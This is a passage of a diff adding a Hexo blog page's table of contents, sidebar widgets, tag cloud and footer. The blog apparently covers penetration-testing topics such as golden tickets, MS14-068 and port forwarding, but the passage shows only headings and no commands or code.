class="toc-link" href="#IPC%E8%BF%9E%E6%8E%A5"><span class="toc-number">6.</span> <span class="toc-text">IPC连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">7.</span> <span class="toc-text">黄金票据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bkrbtgt%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF"><span class="toc-number">7.1.</span> <span class="toc-text">查看krbtgt相关信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9C%80%E8%A6%81%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">7.2.</span> <span class="toc-text">需要的信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C"><span class="toc-number">7.3.</span> <span class="toc-text">制作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E7%9A%84%E7%94%A8%E9%80%94-x3D-gt-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">7.4.</span> <span class="toc-text">黄金票据的用途&#x3D;&gt;权限维持</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MS14-068"><span class="toc-number">8.</span> <span class="toc-text">MS14-068</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E4%B8%ADcopy%E4%B8%8Excopy"><span class="toc-number">9.</span> <span class="toc-text">windows中copy与xcopy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E7%99%BD%E5%90%8D%E5%8D%95"><span class="toc-number">10.</span> <span class="toc-text">windows白名单</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-sc"><span class="toc-number">10.1.</span> <span class="toc-text">windows sc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-wmic"><span class="toc-number">10.2.</span> <span class="toc-text">windows wmic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-at"><span class="toc-number">10.3.</span> <span class="toc-text">windows at</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">11.</span> <span class="toc-text">端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E5%9C%BA%E6%99%AF"><span class="toc-number">11.1.</span> <span class="toc-text">内网场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows%EF%BC%88netsh%EF%BC%89"><span class="toc-number">11.2.</span> <span class="toc-text">windows（netsh）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux%EF%BC%88iptables%EF%BC%89"><span class="toc-number">11.3.</span> <span class="toc-text">linux（iptables）</span></a></li></ol></li></ol>
+  </div>
+</section>
+
+
+      
+<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
+</svg>
+    <span>NOTICE</span>
+  </div>
+  <div class="widget-body">
+    <p>博客主题更新，主题详情查看https://github.com/miiiku/flex-block</p>
+  </div>
+</section>
+
+
+      <section class="widget-categorys widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+    <span>CATEGORYS</span>
+  </div>
+  <div class="widget-body">
+    <ul class="categorys-list">
+      
+        <li class="categorys-list-item">
+          <a href="/imemaker/imemaker.github.io/categories/%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/">
+            技术博客 (11)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/imemaker/imemaker.github.io/categories/%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/VulnStack/">
+            VulnStack (6)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/imemaker/imemaker.github.io/categories/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/">
+            个人博客 (1)
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+</section>
+
+      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+    <span>TAGS</span>
+  </div>
+  <div class="widget-body">
+    <div class="tags-cloud">
+      <a href="/imemaker/imemaker.github.io/tags/CVE-2020-1472/" style="font-size: 10px;" class="tags-cloud-0">CVE-2020-1472</a> <a href="/imemaker/imemaker.github.io/tags/CVE-2021-44228/" style="font-size: 10px;" class="tags-cloud-0">CVE-2021-44228</a> <a href="/imemaker/imemaker.github.io/tags/CobaltStrike/" style="font-size: 10px;" class="tags-cloud-0">CobaltStrike</a> <a href="/imemaker/imemaker.github.io/tags/Hexo/" style="font-size: 10px;" class="tags-cloud-0">Hexo</a> <a href="/imemaker/imemaker.github.io/tags/Log4j2/" style="font-size: 10px;" class="tags-cloud-0">Log4j2</a> <a href="/imemaker/imemaker.github.io/tags/MSF/" style="font-size: 10px;" class="tags-cloud-0">MSF</a> <a href="/imemaker/imemaker.github.io/tags/NTLM/" style="font-size: 10px;" class="tags-cloud-0">NTLM</a> <a href="/imemaker/imemaker.github.io/tags/RCE/" style="font-size: 10px;" class="tags-cloud-0">RCE</a> <a href="/imemaker/imemaker.github.io/tags/Windows%E8%AE%A4%E8%AF%81/" style="font-size: 10px;" class="tags-cloud-0">Windows认证</a> <a href="/imemaker/imemaker.github.io/tags/access-token/" style="font-size: 10px;" class="tags-cloud-0">access token</a> <a href="/imemaker/imemaker.github.io/tags/cobaltstrike/" style="font-size: 10px;" class="tags-cloud-0">cobaltstrike</a> <a href="/imemaker/imemaker.github.io/tags/cs-msf%E4%BA%92%E8%BD%AC/" style="font-size: 10px;" class="tags-cloud-0">cs/msf互转</a> <a href="/imemaker/imemaker.github.io/tags/joomla/" style="font-size: 10px;" class="tags-cloud-0">joomla</a> <a href="/imemaker/imemaker.github.io/tags/kerberos/" style="font-size: 10px;" class="tags-cloud-0">kerberos</a> <a href="/imemaker/imemaker.github.io/tags/ms14-058/" style="font-size: 10px;" class="tags-cloud-0">ms14-058</a> <a href="/imemaker/imemaker.github.io/tags/ms14-068/" style="font-size: 14px;" class="tags-cloud-4">ms14-068</a> <a href="/imemaker/imemaker.github.io/tags/ms17-010/" style="font-size: 12px;" class="tags-cloud-2">ms17-010</a> <a href="/imemaker/imemaker.github.io/tags/ms17-010%E9%97%B4%E6%8E%A5%E5%88%A9%E7%94%A8/" style="font-size: 10px;" class="tags-cloud-0">ms17-010间接利用</a> <a href="/imemaker/imemaker.github.io/tags/mysql%E8%8E%B7%E5%8F%96webshell/" style="font-size: 10px;" class="tags-cloud-0">mysql获取webshell</a> <a href="/imemaker/imemaker.github.io/tags/phpmyadmin/" style="font-size: 10px;" class="tags-cloud-0">phpmyadmin</a> <a href="/imemaker/imemaker.github.io/tags/sc%E5%91%BD%E4%BB%A4/" style="font-size: 10px;" class="tags-cloud-0">sc命令</a> <a href="/imemaker/imemaker.github.io/tags/struts2/" style="font-size: 10px;" class="tags-cloud-0">struts2</a> <a href="/imemaker/imemaker.github.io/tags/thinkphp5-rce/" style="font-size: 10px;" class="tags-cloud-0">thinkphp5-rce</a> <a href="/imemaker/imemaker.github.io/tags/tomcat/" style="font-size: 10px;" class="tags-cloud-0">tomcat</a> <a href="/imemaker/imemaker.github.io/tags/usage/" style="font-size: 10px;" class="tags-cloud-0">usage</a> <a href="/imemaker/imemaker.github.io/tags/weblogic/" style="font-size: 12px;" class="tags-cloud-2">weblogic</a> <a href="/imemaker/imemaker.github.io/tags/why/" style="font-size: 10px;" class="tags-cloud-0">why</a> <a href="/imemaker/imemaker.github.io/tags/windows-linux%E9%98%B2%E7%81%AB%E5%A2%99/" style="font-size: 10px;" class="tags-cloud-0">windows/linux防火墙</a> <a href="/imemaker/imemaker.github.io/tags/windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;" class="tags-cloud-0">windows命令执行</a> <a href="/imemaker/imemaker.github.io/tags/%E4%BB%A4%E7%89%8C%E4%BC%AA%E9%80%A0/" style="font-size: 10px;" class="tags-cloud-0">令牌伪造</a> <a href="/imemaker/imemaker.github.io/tags/%E4%BF%A1%E6%81%AF%E5%9B%9E%E6%98%BE/" style="font-size: 10px;" class="tags-cloud-0">信息回显</a> <a href="/imemaker/imemaker.github.io/tags/%E5%86%85%E7%BD%91%E5%A4%9A%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/" style="font-size: 10px;" class="tags-cloud-0">内网多层网络代理</a> <a href="/imemaker/imemaker.github.io/tags/%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1/" style="font-size: 10px;" class="tags-cloud-0">内网服务</a> <a href="/imemaker/imemaker.github.io/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/" style="font-size: 18px;" class="tags-cloud-8">内网靶机</a> <a href="/imemaker/imemaker.github.io/tags/%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83/" style="font-size: 10px;" class="tags-cloud-0">域内提权</a> <a href="/imemaker/imemaker.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 20px;" class="tags-cloud-10">渗透测试</a> <a href="/imemaker/imemaker.github.io/tags/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/" style="font-size: 10px;" class="tags-cloud-0">白银票据</a> <a href="/imemaker/imemaker.github.io/tags/%E8%84%8F%E7%89%9B/" style="font-size: 10px;" class="tags-cloud-0">脏牛</a> <a href="/imemaker/imemaker.github.io/tags/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/" style="font-size: 16px;" class="tags-cloud-6">黄金票据</a>
+    </div>
+  </div>
+</section>
+    </div>
+  </article>
+</div>
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    
+    <div class="social-icons">
+      
+        
+      
+        
+      
+        
+      
+        
+          <a href="https://github.com/imemaker" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
+</svg>
+          </a>
+        
+      
+        
+      
+    </div>
+     
+    <p>&copy; 2022 <a href="/" target="_blank">E-Maker</a></p>
+
+    
+
+    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>
+
+    <p>
+      <a href="javascript:;" id="theme-light">🌞 浅色</a>
+      <a href="javascript:;" id="theme-dark">🌛 深色</a>
+      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
+    </p>
+  </div>
+</footer>
+  </div>
+
+  <div class="back-to-top-fixed soft-size--round soft-style--box">
+    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
+      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
+      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
+    </svg>
+  </div>
+
+  
+  <!-- aplayer -->
+
+
+<!-- dplayer -->
+
+
+
+
+  
+
+
+  
+
+
+  
+
+
+
+
+<script src="/imemaker/imemaker.github.io/js/script.js"></script>
+
+
+  
+  <!-- 尾部用户自定义相关内容 -->
+</body>
+</html>
